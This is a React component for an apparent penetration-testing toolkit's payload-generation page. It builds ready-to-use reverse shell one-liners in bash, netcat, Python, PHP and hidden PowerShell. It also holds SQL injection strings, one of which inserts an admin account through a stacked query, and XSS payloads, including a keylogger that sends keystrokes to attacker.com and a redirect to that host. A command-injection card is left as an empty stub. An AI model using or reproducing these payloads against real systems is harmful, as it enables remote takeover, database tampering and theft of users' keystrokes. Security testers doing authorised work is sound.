import React, { useState } from 'react';
import ToolCard from '../common/ToolCard';
import TerminalOutput from '../common/TerminalOutput';

const PayloadTools: React.FC = () => {
  const [reverseShellIp, setReverseShellIp] = useState('');
  const [reverseShellPort, setReverseShellPort] = useState('4444');
  const [reverseShellType, setReverseShellType] = useState('bash');
  const [generatedPayload, setGeneratedPayload] = useState('');

  const [sqlPayloadType, setSqlPayloadType] = useState('union');
  const [sqlPayload, setSqlPayload] = useState('');

  const [xssPayloadType, setXssPayloadType] = useState('basic');
  const [xssPayload, setXssPayload] = useState('');

  const generateReverseShell = () => {
    if (!reverseShellIp || !reverseShellPort) return;

    const payloads: { [key: string]: string } = {
      bash: `bash -i >& /dev/tcp/${reverseShellIp}/${reverseShellPort} 0>&1`,
      netcat: `nc -e /bin/sh ${reverseShellIp} ${reverseShellPort}`,
      python: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${reverseShellIp}",${reverseShellPort}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`,
      php: `php -r '$sock=fsockopen("${reverseShellIp}",${reverseShellPort});exec("/bin/sh -i <&3 >&3 2>&3");'`,
      powershell: `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object Net.Sockets.TCPClient("${reverseShellIp}",${reverseShellPort});$stream = $client.GetStream();[byte[]]$bytes = 0..255|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`
    };

    const payload = payloads[reverseShellType] || payloads.bash;
    setGeneratedPayload(`[*] Generated ${reverseShellType} reverse shell:\n\n${payload}\n\n[*] Remember to set up a listener: nc -lvp ${reverseShellPort}`);
  };

  const generateSqlPayload = () => {
    const payloads: { [key: string]: string } = {
      union: "' UNION SELECT 1,2,3,database(),user(),version()--",
      boolean: "' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
      time: "'; WAITFOR DELAY '00:00:10'--",
      error: "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e))--",
      stacked: "'; INSERT INTO users (username,password) VALUES ('admin','password')--"
    };

    const payload = payloads[sqlPayloadType];
    setSqlPayload(`[*] Generated ${sqlPayloadType} SQL injection payload:\n\n${payload}\n\n[*] Test this payload in vulnerable parameters like ?id=1${payload}`);
  };

  const generateXssPayload = () => {
    const payloads: { [key: string]: string } = {
      basic: '<script>alert("XSS")</script>',
      cookie: '<script>alert(document.cookie)</script>',
      redirect: '<script>window.location="http://attacker.com"</script>',
      keylogger: '<script>document.addEventListener("keydown",function(e){fetch("http://attacker.com/log?key="+e.key)})</script>',
      bypass: '<img src=x onerror=alert("XSS")>',
      svg: '<svg onload=alert("XSS")></svg>'
    };

    const payload = payloads[xssPayloadType];
    setXssPayload(`[*] Generated ${xssPayloadType} XSS payload:\n\n${payload}\n\n[*] Test this payload in input fields, URL parameters, or wherever user input is reflected`);
  };

  return (
    <div className="space-y-8">
      <div className="text-center mb-8">
        <h2 className="text-2xl font-cyber font-bold text-cyber-green mb-2">
          💥 Payload Generation
        </h2>
        <p className="text-cyber-green/70">
          Generate various payloads for penetration testing
        </p>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
        <ToolCard title="Reverse Shell Generator" description="Generate reverse shell payloads for different platforms">
          <div className="space-y-4">
            <input
              type="text"
              placeholder="Attacker IP (e.g., 192.168.1.100)"
              value={reverseShellIp}
              onChange={(e) => setReverseShellIp(e.target.value)}
              className="cyber-input w-full"
            />
            <input
              type="text"
              placeholder="Port (e.g., 4444)"
              value={reverseShellPort}
              onChange={(e) => setReverseShellPort(e.target.value)}
              className="cyber-input w-full"
            />
            <select
              value={reverseShellType}
              onChange={(e) => setReverseShellType(e.target.value)}
              className="cyber-input w-full"
            >
              <option value="bash">Bash</option>
              <option value="netcat">Netcat</option>
              <option value="python">Python</option>
              <option value="php">PHP</option>
              <option value="powershell">PowerShell</option>
            </select>
            <button onClick={generateReverseShell} className="cyber-button w-full">
              Generate Payload
            </button>
            <TerminalOutput content={generatedPayload} />
          </div>
        </ToolCard>

        <ToolCard title="SQL Injection Payloads" description="Generate SQL injection test payloads">
          <div className="space-y-4">
            <select
              value={sqlPayloadType}
              onChange={(e) => setSqlPayloadType(e.target.value)}
              className="cyber-input w-full"
            >
              <option value="union">UNION Based</option>
              <option value="boolean">Boolean Based</option>
              <option value="time">Time Based</option>
              <option value="error">Error Based</option>
              <option value="stacked">Stacked Queries</option>
            </select>
            <button onClick={generateSqlPayload} className="cyber-button w-full">
              Generate SQL Payload
            </button>
            <TerminalOutput content={sqlPayload} />
          </div>
        </ToolCard>

        <ToolCard title="XSS Payloads" description="Generate Cross-Site Scripting (XSS) payloads">
          <div className="space-y-4">
            <select
              value={xssPayloadType}
              onChange={(e) => setXssPayloadType(e.target.value)}
              className="cyber-input w-full"
            >
              <option value="basic">Basic Alert</option>
              <option value="cookie">Cookie Stealer</option>
              <option value="redirect">Redirect</option>
              <option value="keylogger">Keylogger</option>
              <option value="bypass">Filter Bypass</option>
              <option value="svg">SVG Vector</option>
            </select>
            <button onClick={generateXssPayload} className="cyber-button w-full">
              Generate XSS Payload
            </button>
            <TerminalOutput content={xssPayload} />
          </div>
        </ToolCard>

        <ToolCard title="Command Injection" description="Generate command injection payloads">
          <div className="space-y-4">
            <select className="cyber-input w-full">
              <option value="basic">Basic Command</option>
              <option value="blind">Blind Injection</option>
              <option value="time">Time-based</option>
            </select>
            <button className="cyber-button w-full">
              Generate Command Payload
            </button>
            <TerminalOutput content="Select payload type and click 'Generate Command Payload' to create command injection vectors..." />
          </div>
        </ToolCard>
      </div>
    </div>
  );
};

export default PayloadTools;